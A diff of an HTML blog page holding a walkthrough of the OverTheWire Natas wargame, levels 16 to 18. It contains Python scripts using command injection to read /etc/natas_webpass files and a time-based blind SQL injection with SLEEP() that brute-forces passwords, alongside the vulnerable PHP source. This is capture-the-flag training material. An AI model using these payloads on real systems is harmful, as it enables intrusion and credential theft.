-                        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+                        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                         &lt;span class="k"&gt;break&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;
 
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="c1"&gt;# authorization: login and password&lt;/span&gt;
-        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas16&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;****************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="c"&gt;# authorization: login and password&lt;/span&gt;
+        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas16&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;****************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
-        &lt;span class="c1"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
+        &lt;span class="c"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
         &lt;span class="n"&gt;CHARS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_letters&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;
         &lt;span class="n"&gt;LENGTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;
 
-        &lt;span class="c1"&gt;# crafted url&lt;/span&gt;
-        &lt;span class="n"&gt;URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://natas16.natas.labs.overthewire.org?needle=$(grep -E ^&amp;#39;&lt;/span&gt;
-        &lt;span class="n"&gt;URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.* /etc/natas_webpass/natas17)banana&amp;amp;submit=Search&amp;#39;&lt;/span&gt;
+        &lt;span class="c"&gt;# crafted url&lt;/span&gt;
+        &lt;span class="n"&gt;URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas16.natas.labs.overthewire.org?needle=$(grep -E ^&amp;#39;&lt;/span&gt;
+        &lt;span class="n"&gt;URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;.* /etc/natas_webpass/natas17)banana&amp;amp;submit=Search&amp;#39;&lt;/span&gt;
 
         &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -771,32 +769,32 @@ Wed Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&
 &lt;p&gt;Around 10 minutes later we get our password.&lt;/p&gt;
 &lt;h3&gt;Level 17: SQL Injection III&lt;/h3&gt;
 &lt;p&gt;This level starts with a username search similar from the 14th and 15th levels:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;/*&lt;/span&gt;
-&lt;span class="c"&gt;CREATE TABLE `users` (&lt;/span&gt;
-&lt;span class="c"&gt;  `username` varchar(64) DEFAULT NULL,&lt;/span&gt;
-&lt;span class="c"&gt;  `password` varchar(64) DEFAULT NULL&lt;/span&gt;
-&lt;span class="c"&gt;);&lt;/span&gt;
-&lt;span class="c"&gt;*/&lt;/span&gt;
-&lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;array_key_exists&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;_REQUEST&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="err"&gt;$link&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="err"&gt;mysql_connect(&amp;#39;localhost&amp;#39;,&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;natas17&amp;#39;,&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="err"&gt;mysql_select_db(&amp;#39;natas17&amp;#39;,&lt;/span&gt; &lt;span class="err"&gt;$link)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="err"&gt;$query&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="err"&gt;&amp;quot;SELECT&lt;/span&gt; &lt;span class="err"&gt;*&lt;/span&gt; &lt;span class="err"&gt;from&lt;/span&gt; &lt;span class="err"&gt;users&lt;/span&gt; &lt;span class="err"&gt;where&lt;/span&gt; &lt;span class="err"&gt;username=\&amp;quot;&amp;quot;.$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="err"&gt;.&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="err"&gt;if(array_key_exists(&amp;quot;debug&amp;quot;,&lt;/span&gt; &lt;span class="err"&gt;$_GET))&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
-        &lt;span class="err"&gt;echo&lt;/span&gt; &lt;span class="err"&gt;&amp;quot;Executing&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="s2"&gt;    }&lt;/span&gt;
-&lt;span class="s2"&gt;    $res = mysql_query($query, $link);&lt;/span&gt;
-&lt;span class="s2"&gt;    if($res) {&lt;/span&gt;
-&lt;span class="s2"&gt;    if(mysql_num_rows($res) &amp;gt; 0) {&lt;/span&gt;
-&lt;span class="s2"&gt;        //echo &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;exists&lt;/span&gt;&lt;span class="o"&gt;.&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="s2"&gt;    } else {&lt;/span&gt;
-&lt;span class="s2"&gt;        //echo &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;doesn&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;exist&lt;/span&gt;&lt;span class="o"&gt;.&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="s2"&gt;    }&lt;/span&gt;
-&lt;span class="s2"&gt;    } else {&lt;/span&gt;
-&lt;span class="s2"&gt;        //echo &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="nt"&gt;mysql_close&lt;/span&gt;&lt;span class="o"&gt;($&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
-&lt;span class="err"&gt;}&lt;/span&gt; &lt;span class="nt"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-&lt;span class="err"&gt;?&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cm"&gt;/*&lt;/span&gt;
+&lt;span class="cm"&gt;CREATE TABLE `users` (&lt;/span&gt;
+&lt;span class="cm"&gt;  `username` varchar(64) DEFAULT NULL,&lt;/span&gt;
+&lt;span class="cm"&gt;  `password` varchar(64) DEFAULT NULL&lt;/span&gt;
+&lt;span class="cm"&gt;);&lt;/span&gt;
+&lt;span class="cm"&gt;*/&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;natas17&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas17&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nv"&gt;$query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * from users where username=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;.&amp;quot;\&amp;quot;&amp;quot;;
+    if(array_key_exists(&amp;quot;debug&amp;quot;, $_GET)) {
+        echo &amp;quot;Executing query: $query&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    }
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) &amp;gt; 0) {
+        //echo &amp;quot;This user exists.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    } else {
+        //echo &amp;quot;This user doesn&amp;#39;t exist.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    }
+    } else {
+        //echo &amp;quot;Error in query.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
+    }
+    mysql_close($link);
+} else {
+?&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -805,7 +803,7 @@ Wed Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&
 &lt;p&gt;We can play with time!&lt;/p&gt;
 &lt;h4&gt;Stating the Attack:&lt;/h4&gt;
 &lt;p&gt;Luckily, MySQL has a query &lt;a href="http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_sleep"&gt;sleep()&lt;/a&gt; that delays the next command for a number of seconds. We can use this as an inject command in the end of our former exploits:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;AND SUBSTRING(password,3,1)) LIKE BINARY AND SLEEP(5) AND &amp;quot;1&amp;quot;=&amp;quot;1
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="n"&gt;LIKE&lt;/span&gt; &lt;span class="n"&gt;BINARY&lt;/span&gt; &lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;SLEEP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -816,35 +814,35 @@ Wed Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&
 &lt;/blockquote&gt;
 &lt;h4&gt;Crafting the Attack:&lt;/h4&gt;
 &lt;p&gt;The new script is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
         &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
             &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                 &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;SQL_URL3&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                 &lt;span class="n"&gt;time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;elapsed&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;total_seconds&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Position &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;: trying &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;... Time: &lt;/span&gt;&lt;span class="si"&gt;%.3f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-                &lt;span class="c1"&gt;#print r.url&lt;/span&gt;
+                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Position &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s"&gt;: trying &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;... Time: &lt;/span&gt;&lt;span class="si"&gt;%.3f&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+                &lt;span class="c"&gt;#print r.url&lt;/span&gt;
                 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                     &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-                    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+                    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                     &lt;span class="k"&gt;break&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;
 
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-        &lt;span class="c1"&gt;# authorization: login and password&lt;/span&gt;
-        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas17&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;****************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="c"&gt;# authorization: login and password&lt;/span&gt;
+        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas17&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;****************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
-        &lt;span class="c1"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
+        &lt;span class="c"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
         &lt;span class="n"&gt;CHARS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_letters&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;
         &lt;span class="n"&gt;LENGTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;
 
-        &lt;span class="c1"&gt;# crafted url&lt;/span&gt;
-        &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://natas17.natas.labs.overthewire.org?username=natas18&amp;quot; AND SUBSTRING(password,&amp;#39;&lt;/span&gt;
-        &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;,1) LIKE BINARY &amp;quot;&amp;#39;&lt;/span&gt;
-        &lt;span class="n"&gt;SQL_URL3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;quot; AND SLEEP(10) AND &amp;quot;1&amp;quot;=&amp;quot;1&amp;#39;&lt;/span&gt;
+        &lt;span class="c"&gt;# crafted url&lt;/span&gt;
+        &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas17.natas.labs.overthewire.org?username=natas18&amp;quot; AND SUBSTRING(password,&amp;#39;&lt;/span&gt;
+        &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;,1) LIKE BINARY &amp;quot;&amp;#39;&lt;/span&gt;
+        &lt;span class="n"&gt;SQL_URL3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;quot; AND SLEEP(10) AND &amp;quot;1&amp;quot;=&amp;quot;1&amp;#39;&lt;/span&gt;
 
         &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -854,39 +852,39 @@ Wed Oct &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&
 &lt;h3&gt;Level 18: Hijacking Session ID&lt;/h3&gt;
 &lt;p&gt;The 18th level starts with a login form, just like the levels before it. The source code is much more intricate though.&lt;/p&gt;
 &lt;p&gt;First, we see the declaration of the size of the id. This is important if we want to brute force the solution:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$maxid = 640; // 640 should be enough for everyone
